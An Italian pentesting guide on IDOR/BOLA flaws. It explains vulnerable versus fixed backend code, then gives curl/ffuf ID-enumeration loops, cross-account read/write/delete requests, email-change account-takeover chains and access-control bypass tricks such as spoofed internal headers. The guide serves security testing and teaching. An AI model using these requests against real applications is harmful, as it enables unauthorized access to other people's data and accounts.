---
title: 'IDOR: Cos''è, Come Si Trova e Come Si Sfrutta — Guida Completa'
slug: idor
description: 'IDOR (Insecure Direct Object Reference) spiegato dal punto di vista del pentester: come si identifica, come si enumera, come si scala a account takeover e data breach. Con esempi reali e checklist operativa.'
image: /idor-attacco.webp
draft: true
date: 2026-06-05T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - expoit
tags:
  - insecure direct object reference
  - BOLA
  - broken access control
---

# IDOR: la vulnerabilità più sottovalutata del web — guida completa

L'**IDOR** (Insecure Direct Object Reference) è una delle vulnerabilità più comuni nei bug bounty e nei pentest su applicazioni web. Il concetto è semplice: l'applicazione usa un identificatore diretto (ID numerico, UUID, nome file) per accedere a una risorsa, e non verifica se l'utente che fa la richiesta ha il permesso di accedere a quella risorsa specifica.

Risultato: cambi un numero nell'URL o in un parametro JSON, e leggi i dati di qualcun altro. O li modifichi. O li cancelli.

IDOR rientra nella categoria **Broken Access Control** (OWASP A01:2021) — la vulnerabilità più diffusa nelle applicazioni web moderne. Nelle API REST viene chiamata anche **BOLA** (Broken Object Level Authorization). Il nome cambia, il problema è lo stesso: nessun controllo sull'autorizzazione a livello di singolo oggetto.

Vedi anche: [auth-access-control-guida-completa](https://hackita.it/articoli/auth-access-control-guida-completa), [broken-access-control](https://hackita.it/articoli/broken-access-control), [account-takeover](https://hackita.it/articoli/account-takeover).

***

## Come Funziona

Immagina un'applicazione di e-commerce. Hai fatto l'ordine #1042. Per visualizzarlo vai su:

```
GET /orders/1042
Cookie: session=TUO_TOKEN
```

L'applicazione riceve la richiesta, legge il token di sessione, recupera l'ordine numero 1042 dal database e te lo mostra. Fin qui tutto normale.

Il problema è cosa succede quando fai:

```
GET /orders/1041
Cookie: session=TUO_TOKEN
```

Se l'applicazione risponde con i dati dell'ordine 1041 — che appartiene a un altro utente — senza verificare che tu abbia il diritto di vederlo, c'è un IDOR. Hai cambiato un numero. Hai letto i dati di qualcun altro.

La logica sbagliata nel backend assomiglia a questa:

```python
# VULNERABILE: controlla solo che l'utente sia autenticato
@app.route('/orders/<int:order_id>')
@login_required
def get_order(order_id):
    order = db.query("SELECT * FROM orders WHERE id = ?", order_id)
    return jsonify(order)

# CORRETTO: controlla che l'ordine appartenga all'utente autenticato
@app.route('/orders/<int:order_id>')
@login_required
def get_order(order_id):
    order = db.query(
        "SELECT * FROM orders WHERE id = ? AND user_id = ?",
        order_id, current_user.id
    )
    if not order:
        abort(403)
    return jsonify(order)
```

La differenza è una sola condizione SQL. L'applicazione verificava l'autenticazione (sei loggato?) ma non l'autorizzazione (questo oggetto è tuo?).

***

## Dove Cercare IDOR

IDOR può stare ovunque ci sia un riferimento diretto a un oggetto. Nella pratica, i posti più produttivi:

**URL path:**

```
/users/4521/profile
/invoices/8834/download
/documents/contracts/2024-final.pdf
/api/v1/tickets/9901
```

**Query string:**

```
/dashboard?account_id=4521
/export?report_id=112
/share?file=backup_2024.zip
```

**Corpo delle richieste POST/PUT (JSON o form):**

```json
{"order_id": 1042, "action": "cancel"}
{"recipient_id": 4521, "amount": 50}
{"document": "invoice_8834.pdf"}
```

**Header HTTP:**

```
X-User-ID: 4521
X-Account: premium_user_99
```

**Cookie:**

```
user_id=4521; role=user
account=4521
```

**Riferimenti indiretti in API REST:**

```
GET /api/messages/thread/5512
GET /api/files/download/abcd1234
PUT /api/users/me/settings   ← "me" è un alias — verifica se /api/users/4521/settings funziona uguale
```

***

## Come Trovare IDOR: Metodologia

### Step 1 — Identifica gli Identificatori

Naviga l'applicazione normalmente con Burp Suite intercept attivo. Cerca tutti i punti dove compaiono ID numerici, UUID, hash, nomi di file — in URL, body, header, cookie. Segnati ogni endpoint che accede a una risorsa per ID.

```bash
# Con Burp: usa il Logger o il Proxy History
# Filtra per parametri che contengono numeri o ID
# Cerca pattern tipo: id=, _id=, user=, account=, order=, doc=, file=

# Con grep su un export di Burp:
grep -iE "(\?|&)(id|user_id|account|order|doc|file)=" burp_export.txt
```

### Step 2 — Crea Due Account di Test

Questo è il requisito fondamentale: devi avere due account distinti (Account A e Account B) per verificare se puoi accedere alle risorse di B usando le credenziali di A.

```
Account A: user_a@test.com / password_a  → user_id = 4521
Account B: user_b@test.com / password_b  → user_id = 4522
```

Crea contenuto con Account B (ordine, documento, messaggio). Poi, autenticato come Account A, accedi all'ID di quell'oggetto.

### Step 3 — Testa l'Accesso Cross-Account

Con i cookie/token di Account A, prova ad accedere alle risorse di Account B:

```bash
# Autenticato come A (user_id=4521), accedo all'ordine di B
curl -s "https://target.com/api/orders/1041" \
  -H "Cookie: session=SESSION_DI_A" | python3 -m json.tool

# Se risponde con i dati dell'ordine di B → IDOR confermato

# Test su endpoint di modifica (più grave)
curl -s -X PUT "https://target.com/api/users/4522/email" \
  -H "Cookie: session=SESSION_DI_A" \
  -H "Content-Type: application/json" \
  -d '{"email":"hacker@evil.com"}'
# Se risponde 200 → IDOR write → account takeover su B
```

### Step 4 — Enumera con Automazione

Una volta confermato l'IDOR in lettura, stima l'impatto reale enumerando un range di ID:

```bash
# Enumerazione di base con curl + bash
for i in $(seq 1000 1100); do
  HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/api/orders/$i" \
    -H "Cookie: session=SESSION_DI_A")
  if [ "$HTTP_CODE" == "200" ]; then
    echo "TROVATO: /api/orders/$i → 200"
  fi
done

# Con ffuf — più veloce su range grandi
ffuf -u "https://target.com/api/orders/FUZZ" \
  -H "Cookie: session=SESSION_DI_A" \
  -w <(seq 1 10000) \
  -mc 200 \
  -o idor_results.json
```

```bash
# Con Burp Intruder:
# 1. Manda la request al Intruder
# 2. Marca l'ID come payload position (§1042§)
# 3. Payload type: Numbers, range 1-10000
# 4. Filtra per status 200 e lunghezza risposta variabile
```

Per un pentest professionale: enumera abbastanza ID da dimostrare l'impatto, non fare una dump completa del database.

***

## Tipi di IDOR e Impatto

### IDOR in Lettura (Read)

Accedi a dati di altri utenti. Impatto dipende da cosa espone l'oggetto.

```bash
# Dati personali (PII) → GDPR violation + High
GET /api/users/4522/profile
# Response: {"name": "Mario Rossi", "email": "mario@...", "phone": "+39...", "address": "..."}

# Documenti riservati → High/Critical
GET /documents/invoice_2024_cliente_enterprise.pdf
Cookie: session=SESSION_DI_A
# Response: fattura di un altro cliente con dati finanziari

# Messaggi privati → High
GET /api/messages/thread/5512
# Response: conversazione privata tra altri utenti
```

### IDOR in Scrittura (Write)

Modifichi oggetti altrui. Spesso porta direttamente ad account takeover.

```bash
# Modifica email di un altro utente → account takeover
PUT /api/users/4522/email
Cookie: session=SESSION_DI_A
{"email": "attacker@evil.com"}
# Poi: "Forgot password" sull'account 4522 → email arriva all'attaccante → ATO

# Modifica password direttamente
PUT /api/users/4522/password
{"password": "newpassword123"}

# Cambio ruolo → privilege escalation
PUT /api/users/4521/role
{"role": "admin"}
# Elevazione di 4521 (Account A) a admin
```

### IDOR in Cancellazione (Delete)

Cancelli oggetti altrui.

```bash
DELETE /api/posts/8834
Cookie: session=SESSION_DI_A
# Cancella il post di un altro utente

DELETE /api/accounts/4522
# Cancella l'account di un altro utente
```

### IDOR su Funzioni (Function-Level)

Non su dati ma su azioni che richiedono permessi specifici.

```bash
POST /api/admin/users/4522/ban
Cookie: session=SESSION_DI_A   ← utente normale
# Se risponde 200 → l'endpoint non controlla che tu sia admin

POST /api/payments/refund
{"order_id": 1041, "amount": 500}
Cookie: session=SESSION_DI_A
# Rimborso su un ordine non tuo
```

***

## IDOR con ID Non Sequenziali

Molte applicazioni usano UUID o hash per "nascondere" gli ID. Non è una mitigazione — è security through obscurity. Se ottieni l'UUID in qualsiasi altro modo (API di listing, share link, email), il problema esiste ancora.

```bash
# UUID in URL
GET /api/documents/3f7a9b2e-1c4d-4e8f-a912-b3c7d8e9f0a1
# Se questo UUID appartiene a un altro utente e puoi accederci → IDOR

# Come trovi UUID altrui?
# 1. L'applicazione li espone in API di listing
GET /api/users       → lista tutti gli utenti con UUID
GET /api/documents   → lista documenti con UUID inclusi quelli altrui

# 2. Share link che contengono UUID
# "Condividi documento" → link con UUID nel parametro → lo usi con un altro account

# 3. Referral/invite link
# "Invita un amico" → link con UUID dell'invitante → recuperi UUID di altri utenti
```

***

## IDOR nelle API REST (BOLA)

Nelle API moderne il pattern è identico ma i parametri sono spesso nel body JSON. Burp Suite non li mostra nell'URL — devi guardare il corpo della richiesta.

```bash
# Endpoint per aggiornare profilo
PATCH /api/v1/profile
Authorization: Bearer TOKEN_DI_A
Content-Type: application/json
{
  "user_id": 4522,     ← prova a cambiare questo
  "bio": "hacked"
}

# Endpoint per trasferimento fondi
POST /api/v1/transfer
Authorization: Bearer TOKEN_DI_A
{
  "from_account": 4521,
  "to_account": 9999,
  "amount": 100
}
# Prova: from_account: 4522 → prelevi dall'account di qualcun altro

# Endpoint con ID nell'header
GET /api/v1/invoices
Authorization: Bearer TOKEN_DI_A
X-Account-ID: 4522    ← header che sovrascrive l'account target
```

***

## IDOR Indiretto

A volte l'ID non è esplicito. L'applicazione usa un riferimento indiretto (nome file, slug, hash) che mappa a un oggetto nel database. Il problema è lo stesso.

```bash
# Nome file nel parametro download
GET /download?file=report_q3_2024.xlsx
# Prova: file=report_q3_2023.xlsx, file=../report_confidenziale.xlsx
# Se restituisce file di altri utenti → IDOR su file system

# Hash MD5 di un ID
GET /api/export?token=d41d8cd98f00b204e9800998ecf8427e
# L'hash è MD5 di "0" → prova MD5 di 1, 2, 3...
echo -n "1" | md5sum   # c4ca4238a0b923820dcc509a6f75849b
GET /api/export?token=c4ca4238a0b923820dcc509a6f75849b

# Slug "indovinabile"
GET /invoice/mario-rossi-2024-03
# Prova: /invoice/giuseppe-bianchi-2024-03
```

***

## Escalation: Da IDOR a Account Takeover

Il path più diretto è via email change:

```
1. Trova IDOR write su /api/users/{id}/email
2. Cambia l'email dell'account target con la tua
3. Vai su "Forgot password" con la nuova email
4. Ricevi il link di reset sulla tua casella
5. Imposta nuova password
6. Accedi all'account target → Account Takeover
```

Oppure via token theft:

```
1. Trova IDOR read su /api/users/{id}/tokens o /api/sessions/{id}
2. Leggi il token di sessione attivo dell'utente target
3. Usa quel token per autenticarti come target → Account Takeover immediato
```

Vedi: [account-takeover](https://hackita.it/articoli/account-takeover), [password-reset-attack](https://hackita.it/articoli/password-reset-attack).

***

## IDOR vs Broken Access Control: La Differenza

IDOR è una sottocategoria di Broken Access Control. La distinzione pratica:

* **IDOR**: accesso non autorizzato a un oggetto specifico tramite ID/riferimento diretto. Orizzontale (stesso ruolo, oggetto altrui).
* **Broken Access Control verticale**: accesso a funzionalità riservate a ruoli superiori (utente che accede a endpoint admin).
* **Broken Access Control su path**: accesso a path non protetti correttamente (directory traversal, endpoint dimenticati).

Nel bug bounty le segnalazioni IDOR tipicamente vengono classificate come P2 (High) se espongono PII o permettono write, P1 (Critical) se portano ad account takeover o data breach di massa.

***

## Bypass Comuni delle Protezioni

Alcune applicazioni implementano protezioni parziali. Vediamo come girarci intorno.

**Controllo solo sul metodo GET, non su POST/PUT:**

```bash
# GET respinge
GET /api/users/4522 → 403

# Ma PUT accetta
PUT /api/users/4522
{"email": "attacker@evil.com"} → 200
```

**Controllo bypassabile con header aggiuntivi:**

```bash
# Request normale → 403
GET /api/admin/users/4522

# Con header che simula accesso interno
GET /api/admin/users/4522
X-Forwarded-For: 127.0.0.1
X-Internal: true
→ 200?
```

**Encoding dell'ID:**

```bash
# ID numerico → 403
GET /api/orders/1041

# ID encodato → accettato?
GET /api/orders/MTA0MQ==     # base64 di "1041"
GET /api/orders/%31%30%34%31  # URL encoding di "1041"
```

**Cambio content type:**

```bash
# JSON → 403
POST /api/users/4522/update
Content-Type: application/json
{"email":"attacker@evil.com"}

# Form data → accettato?
POST /api/users/4522/update
Content-Type: application/x-www-form-urlencoded
email=attacker%40evil.com
```

**Wrap dell'ID in array o oggetto:**

```bash
# ID singolo → 403
{"user_id": 4522}

# Array → accettato?
{"user_id": [4522]}
{"user_id": {"id": 4522}}
```

***

## Checklist

```
SETUP
☐ Due account di test creati (A e B)
☐ Burp Suite attivo con intercept
☐ IDs di A e B annotati (user_id, account_id, ecc.)

DISCOVERY
☐ Tutti gli endpoint con ID identificati (URL, body, header, cookie)
☐ Tipi di ID: numerico, UUID, hash, nome file, slug
☐ Endpoint CRUD mappati (GET, POST, PUT, PATCH, DELETE)

TEST BASE
☐ GET su risorse di B con sessione di A → 200 o 403?
☐ PUT/PATCH su risorse di B con sessione di A → 200 o 403?
☐ DELETE su risorse di B con sessione di A → 200 o 403?
☐ Azioni funzionali (ban, refund, export) su oggetti di B?

TEST AVANZATO
☐ UUID/hash: ottenuto da listing o share link? Testato cross-account?
☐ ID in JSON body testato (non solo in URL)
☐ ID in header testato (X-Account-ID, X-User-ID)
☐ ID in cookie testato
☐ Bypass: encoding, array wrap, content type change, header interni

ESCALATION
☐ IDOR write su email → chain a password reset → ATO?
☐ IDOR read su token di sessione → ATO diretto?
☐ IDOR su ruolo → privilege escalation verticale?

IMPATTO
☐ Dati esposti: PII, finanziari, medici, credenziali?
☐ Numero di record accessibili (range di ID validi)?
☐ Impatto stimato: utenti colpibili × tipo di dato
```

***

## FAQ

**Qual è la differenza tra IDOR e BOLA?**
Stesso concetto, nome diverso per contesto. IDOR è il termine classico per applicazioni web tradizionali. BOLA (Broken Object Level Authorization) è il termine usato nelle API REST e nel contesto OWASP API Security Top 10.

**IDOR con UUID è meno grave?**
No. UUID non è una mitigazione — rende più difficile la discovery per forza bruta, ma se l'UUID è ottenibile in altro modo (listing, link condivisi, email) il problema è identico. La vera mitigazione è il controllo dell'autorizzazione lato server.

**Come si distingue IDOR da un comportamento intenzionale?**
Se l'applicazione intende dare accesso pubblico a quella risorsa, non è IDOR. Il test è: l'applicazione ha un concetto di "proprietario" di quella risorsa? Se sì, verifica che lo controlli. Se l'accesso cross-account è involontario, è IDOR.

**Posso testare IDOR senza due account?**
In alcuni casi. Se l'applicazione espone ID in risposta a chiamate API (es. lista utenti), puoi usare quelli per testare l'accesso anche con un solo account. Ma il test è molto più solido con due account.

**Che severità assegno in un report?**

* Read su dati non sensibili (es. conteggio ordini) → Low/Medium
* Read su PII (nome, email, telefono, indirizzo) → High
* Read su dati finanziari o medici → High/Critical
* Write su dati altrui → High
* Chain IDOR → Account Takeover → Critical

***

> Accesso non autorizzato ai dati dei tuoi utenti, modifiche su account altrui, data breach silenziosi: IDOR è spesso la vulnerabilità che fa più danni con meno rumore. [Penetration test HackIta](https://hackita.it/servizi). [Formazione 1:1](https://hackita.it/formazione).
